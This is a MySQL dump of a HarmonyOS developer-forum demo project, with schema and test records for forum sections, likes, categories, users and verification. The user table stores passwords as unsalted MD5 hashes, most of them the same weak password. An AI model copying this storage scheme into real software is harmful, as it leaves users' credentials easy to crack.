-- ----------------------------
-- Records of plate
-- ----------------------------
INSERT INTO `plate` VALUES (1, 'HarmonyOS专区', 0, '', '', '2021-12-25 23:36:13', '2021-12-25 23:36:13');
INSERT INTO `plate` VALUES (2, '其他板块', 0, '', '', '2021-12-16 00:25:09', '2021-12-16 00:25:20');
INSERT INTO `plate` VALUES (3, '应用/服务开发', 1, '', '', '2021-12-16 00:29:05', '2021-12-16 00:29:05');
INSERT INTO `plate` VALUES (4, '设备开发', 1, '', '', '2021-12-16 00:29:17', '2021-12-16 00:29:17');
INSERT INTO `plate` VALUES (5, 'HarmonyOS Connect', 1, '', '', '2021-12-16 00:29:32', '2021-12-16 00:29:32');
INSERT INTO `plate` VALUES (6, '综合板块', 2, '', '', '2021-12-16 00:29:51', '2021-12-17 00:54:15');
INSERT INTO `plate` VALUES (7, 'HMS Core', 2, '', '', '2021-12-16 00:29:57', '2021-12-16 00:29:57');
INSERT INTO `plate` VALUES (8, 'API与组件', 3, '', '', '2021-12-16 01:22:53', '2021-12-16 01:22:53');
INSERT INTO `plate` VALUES (9, '芯片/模组/开发板', 4, '', '', '2021-12-16 21:19:07', '2021-12-16 21:19:07');
INSERT INTO `plate` VALUES (10, 'AR/VR', 2, NULL, NULL, '2022-01-13 23:02:41', '2022-01-16 22:56:46');
INSERT INTO `plate` VALUES (13, '-', 14, NULL, NULL, '2022-01-16 22:59:49', '2022-01-16 23:42:47');
INSERT INTO `plate` VALUES (14, '--', 0, NULL, NULL, '2022-01-16 22:59:59', '2022-01-16 23:01:03');
INSERT INTO `plate` VALUES (15, 'dsa', 0, NULL, 'dadasds', '2022-01-16 23:44:14', '2022-01-16 23:44:14');
INSERT INTO `plate` VALUES (16, '-*/', 15, NULL, NULL, '2022-02-08 02:16:24', '2022-02-08 02:16:24');
INSERT INTO `plate` VALUES (17, '234234', 15, NULL, NULL, '2022-02-08 02:17:35', '2022-02-08 02:17:35');
INSERT INTO `plate` VALUES (18, '----------', 0, 'http://127.0.0.1:8080/upload/image/plate/2022/2/11/fa1d2089-7018-4024-9b9e-99988d2089c4.png', NULL, '2022-02-11 18:08:04', '2022-02-11 18:08:04');

-- ----------------------------
-- Table structure for prefer
-- ----------------------------
DROP TABLE IF EXISTS `prefer`;
CREATE TABLE `prefer`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userid` int(11) NULL DEFAULT NULL,
  `datasource` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `dataid` int(11) NULL DEFAULT NULL,
  `push` int(1) NULL DEFAULT NULL,
  `createtime` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 92 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of prefer
-- ----------------------------
INSERT INTO `prefer` VALUES (7, 2, 'article', 1, 1, '2022-1-6 01:01:13');
INSERT INTO `prefer` VALUES (14, 2, 'comment', 5, 1, '2022-1-7 01:01:13');
INSERT INTO `prefer` VALUES (15, 2, 'comment', 6, 1, '2022-1-8 01:01:13');
INSERT INTO `prefer` VALUES (16, 2, 'comment', 1, 1, '2022-1-9 01:01:13');
INSERT INTO `prefer` VALUES (23, 1, 'comment', 12, 1, '2022-1-9 02:01:13');
INSERT INTO `prefer` VALUES (27, 1, 'comment', 11, 1, '2022-1-9 05:01:13');
INSERT INTO `prefer` VALUES (28, 1, 'comment', 10, 1, '2022-1-9 06:01:13');
INSERT INTO `prefer` VALUES (29, 1, 'comment', 3, 1, '2022-1-10 01:01:13');
INSERT INTO `prefer` VALUES (56, 1, 'comment', 6, 1, '2022-1-10 01:01:13');
INSERT INTO `prefer` VALUES (59, 1, 'comment', 9, 1, '2022-1-10 01:01:13');
INSERT INTO `prefer` VALUES (66, 1, 'comment', 2, 1, '2022-1-10 01:01:13');
INSERT INTO `prefer` VALUES (67, 1, 'comment', 1, 1, '2022-1-10 01:01:13');
INSERT INTO `prefer` VALUES (77, 2, 'comment', 27, 1, '2022-1-10 01:01:13');
INSERT INTO `prefer` VALUES (78, 2, 'article', 5, 1, '2022-1-10 01:01:13');
INSERT INTO `prefer` VALUES (79, 1, 'comment', 31, 1, '2022-1-10 01:01:13');
INSERT INTO `prefer` VALUES (82, 1, 'article', 13, 1, '2022-1-10 22:34:13');
INSERT INTO `prefer` VALUES (88, 1, 'article', 1, 1, NULL);
INSERT INTO `prefer` VALUES (89, 1, 'article', 2, 1, NULL);
INSERT INTO `prefer` VALUES (90, 1, 'article', 3, 1, '2022-01-11 22:21:08');

-- ----------------------------
-- Table structure for root
-- ----------------------------
DROP TABLE IF EXISTS `root`;
CREATE TABLE `root`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `root` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `createtime` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `updatetime` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 7 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of root
-- ----------------------------
INSERT INTO `root` VALUES (1, 'HMS Core', '2021-12-16 21:59:13', '2021-12-16 21:59:13');
INSERT INTO `root` VALUES (2, 'HarmonyOS', '2021-12-16 22:32:25', '2021-12-16 22:40:59');
INSERT INTO `root` VALUES (3, '计算机语言', '2021-12-16 22:41:22', '2021-12-16 22:41:22');
INSERT INTO `root` VALUES (4, '其他', '2021-12-16 22:41:22', '2021-12-16 22:41:22');

-- ----------------------------
-- Table structure for user
-- ----------------------------
DROP TABLE IF EXISTS `user`;
CREATE TABLE `user`  (
  `uid` int(11) NOT NULL AUTO_INCREMENT,
  `nickname` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '昵称',
  `password` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `summary` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '简介',
  `portrait` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '头像',
  `grow` int(11) NULL DEFAULT NULL COMMENT '经验值',
  `integral` int(11) NULL DEFAULT NULL COMMENT '积分',
  `status` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '状态：Enable：启用，Disable：禁用',
  `sex` varchar(10) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `phone` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `email` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `online` int(1) NULL DEFAULT NULL,
  `isdel` int(1) NULL DEFAULT NULL,
  `starttime` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `finaltime` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `createtime` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `updatetime` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  PRIMARY KEY (`uid`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 23 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of user
-- ----------------------------
INSERT INTO `user` VALUES (1, '仰望星空', '4297f44b13955235245b2497399d7a93', '一个伪装成消费者的超级管理员', 'http://127.0.0.1:8080/upload/image/user/2021/12/14/22e1137a-f4cb-4de9-a6ff-33a0538fafb2.png', 19000, 330, '启用', NULL, NULL, NULL, NULL, 1, 0, NULL, NULL, '2021-10-25 23:05:58', '2021-12-14 21:28:55');
INSERT INTO `user` VALUES (2, '小羊', 'e10adc3949ba59abbe56e057f20f883e', '小羊', 'http://127.0.0.1:8080/upload/image/user/2021/12/1/459f1ca6-0851-41d1-89e4-58b1abd9f067.png', 8000, 200, '启用', NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, '2021-12-01 20:52:23', '2021-12-01 20:52:23');
INSERT INTO `user` VALUES (3, '浩瀚星空', 'e10adc3949ba59abbe56e057f20f883e', '浩瀚星空', 'http://127.0.0.1:8080/upload/image/user/2021/12/1/653ce874-48cb-4ae1-a113-7ea250c735e7.png', 6000, 61, '启用', NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, '2021-12-01 20:53:36', '2021-12-01 20:53:36');
INSERT INTO `user` VALUES (4, '屋顶上的拾荒人', 'e10adc3949ba59abbe56e057f20f883e', '屋顶上的拾荒人', 'http://127.0.0.1:8080/upload/image/user/2021/12/1/e6ff84ff-35fb-4c87-85fa-32cd0b7422d5.png', 4000, 61, '启用', NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, '2021-12-01 20:54:12', '2021-12-01 20:54:12');
INSERT INTO `user` VALUES (5, '繁华漫天', 'e10adc3949ba59abbe56e057f20f883e', '繁华漫天', 'http://127.0.0.1:8080/upload/image/user/2021/12/1/f0608307-325c-4e0b-8f41-661cb5e2a0cc.png', 2500, 19, '启用', NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, '2021-12-01 20:57:46', '2021-12-01 20:57:46');
INSERT INTO `user` VALUES (6, 'Dream', 'e10adc3949ba59abbe56e057f20f883e', 'Dream', 'http://127.0.0.1:8080/upload/image/user/2021/12/1/f0608307-325c-4e0b-8f41-661cb5e2a0cc.png', 1500, 2, '启用', NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, '2021-12-01 20:59:09', '2021-12-01 21:00:15');
INSERT INTO `user` VALUES (7, '唯一', 'e10adc3949ba59abbe56e057f20f883e', '唯一', 'http://127.0.0.1:8080/upload/image/user/2021/12/1/ba9f7971-0893-4688-a65a-73f51f7364fc.png', 800, 0, '启用', NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, '2021-12-01 20:59:52', '2021-12-01 20:59:52');
INSERT INTO `user` VALUES (8, 'Glass', 'e10adc3949ba59abbe56e057f20f883e', 'Glass', 'http://127.0.0.1:8080/upload/image/user/2021/12/1/92d5bb6c-54c6-4c92-a3f3-59f13bcdd37d.png', 300, 0, '启用', NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, '2021-12-01 21:00:39', '2021-12-01 21:00:39');
INSERT INTO `user` VALUES (9, '青梅雨水', 'e10adc3949ba59abbe56e057f20f883e', '青梅雨水', 'http://127.0.0.1:8080/upload/image/user/2021/12/1/068fc25b-50aa-4fd1-a5ac-0d307c729156.png', 100, 61, '启用', NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, '2021-12-01 21:01:23', '2021-12-01 21:01:23');
INSERT INTO `user` VALUES (10, '意难平', 'e10adc3949ba59abbe56e057f20f883e', '意难平', 'http://127.0.0.1:8080/upload/image/user/2021/12/1/8bd6a3cc-939c-43d3-8c20-9ca228c4da53.png', 30, 19, '启用', NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, '2021-12-01 21:01:46', '2021-12-01 21:01:46');
INSERT INTO `user` VALUES (11, 'Lemon', 'e10adc3949ba59abbe56e057f20f883e', 'Lemon', 'http://127.0.0.1:8080/upload/image/user/2021/12/1/c1c1f8c9-b4ed-46c5-b820-5b1dc816c2fd.png', 0, 2, '启用', NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, '2021-12-01 21:02:20', '2021-12-01 21:02:20');
INSERT INTO `user` VALUES (12, 'Alone', 'e10adc3949ba59abbe56e057f20f883e', 'Alone', 'http://127.0.0.1:8080/upload/image/user/2021/12/1/8274b73b-4e81-408c-b5cc-8de96a7ac771.png', 800, 0, '启用', NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, '2021-12-01 21:02:45', '2021-12-01 21:02:45');
INSERT INTO `user` VALUES (13, '飞鸟', 'e10adc3949ba59abbe56e057f20f883e', '飞鸟', 'http://127.0.0.1:8080/upload/image/user/2021/12/1/3a014a79-ca8f-4cd0-93e0-ec64ba9d53fd.png', 300, 0, '启用', NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, '2021-12-01 21:03:06', '2021-12-01 21:03:06');
INSERT INTO `user` VALUES (14, 'Alan', 'e10adc3949ba59abbe56e057f20f883e', 'Alan', 'http://127.0.0.1:8080/upload/image/user/2021/12/1/90698bc1-14d6-424f-8dcb-34edd8957b43.png', 100, 61, '启用', NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, '2021-12-01 21:03:59', '2021-12-01 21:03:59');
INSERT INTO `user` VALUES (15, '周深', 'e10adc3949ba59abbe56e057f20f883e', '周深', 'http://127.0.0.1:8080/upload/image/user/2021/12/1/f8a73494-6d88-4a10-bdf2-e07b1e8625ad.png', 30, 19, '启用', NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, '2021-12-01 21:04:31', '2021-12-01 21:04:31');
INSERT INTO `user` VALUES (16, '运气来的若有似无', 'e10adc3949ba59abbe56e057f20f883e', '运气来的若有似无', 'http://127.0.0.1:8080/upload/image/user/2021/12/1/ed1fb970-a50c-400a-80bc-16bec2f54dfb.png', 0, 2, '启用', NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, '2021-12-01 21:05:08', '2021-12-01 21:05:08');
INSERT INTO `user` VALUES (17, 'Sweet', 'e10adc3949ba59abbe56e057f20f883e', NULL, 'http://127.0.0.1:8080/upload/image/user/默认头像.png', 0, 0, '启用', NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, '2021-12-13 20:17:59', '2021-12-13 20:17:59');
INSERT INTO `user` VALUES (18, 'Heart', 'e10adc3949ba59abbe56e057f20f883e', NULL, 'http://127.0.0.1:8080/upload/image/user/默认头像.png', 0, 0, '启用', NULL, NULL, NULL, NULL, 0, 0, NULL, NULL, '2021-12-13 20:19:32', '2021-12-13 20:19:32');
INSERT INTO `user` VALUES (20, '123', 'f5bb0c8de146c67b44babbf4e6584cc0', '', 'http://127.0.0.1:8080/upload/image/user/默认头像.png', 0, 0, '启用', '女', '123', '13412312312', '123@qq.com', 0, 0, NULL, NULL, '2022-01-22 11:58:03', '2022-01-22 11:58:03');
INSERT INTO `user` VALUES (22, '1312321', 'f5bb0c8de146c67b44babbf4e6584cc0', '123', 'http://127.0.0.1:8080/upload/image/user/默认头像.png', 0, 0, '禁用', '女', '123', '15100000001', '123@c.om', 0, 0, '2022-1-22 13:27:10', '2022-1-29 13:27:10', '2022-01-22 12:37:01', '2022-01-22 13:29:23');

-- ----------------------------
-- Table structure for verify
-- ----------------------------
DROP TABLE IF EXISTS `verify`;
CREATE TABLE `verify`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userid` int(11) NULL DEFAULT NULL,
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `school` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `position` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `technology` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `introduce` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL,
  `start` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `end` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `experience` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `detail` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL,
  `photo` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `type` int(1) NULL DEFAULT NULL,
  `status` int(1) NULL DEFAULT NULL,
  `createtime` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  `updatetime` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of verify
-- ----------------------------
INSERT INTO `verify` VALUES (1, 1, '1', '1', '教授', '1', '1', '2022-2-25 0:0:0', '2022-2-26 0:0:0', '1', '1', '', 1, 1, '2022-02-12 18:54:57', '2022-02-12 18:54:57');

SET FOREIGN_KEY_CHECKS = 1;
